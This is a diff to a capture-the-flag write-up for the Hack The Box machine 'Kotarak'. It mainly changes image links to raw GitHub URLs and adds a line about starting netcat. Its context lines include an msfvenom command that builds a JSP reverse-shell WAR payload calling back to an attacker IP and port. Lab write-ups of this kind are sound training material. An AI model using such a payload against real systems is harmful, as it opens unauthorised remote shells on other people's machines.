@@ -30,7 +30,7 @@ This Machine is the Hard level machine so i will prefer the Full Port Scan :-
 
 → [localhost:888](http://localhost:888) has interesting things :
 
-![https://github.com/unknown00759/unknown00759.github.io/blob/master/img/HTB-KOTARAK/back.png](https://github.com/unknown00759/unknown00759.github.io/blob/master/img/HTB-KOTARAK/back.png)
+![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/back.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/back.png)
 
 → Taking a look at **backup** option.
 
@@ -51,7 +51,9 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f war > 
 ```
 ![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/tommm.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/tommm.png)
 
-![https://github.com/unknown00759/unknown00759.github.io/blob/master/img/HTB-KOTARAK/image.png](https://github.com/unknown00759/unknown00759.github.io/blob/master/img/HTB-KOTARAK/image.png)
+*Starting out netcat 
+
+![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/image.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/image.png)
 
 
 
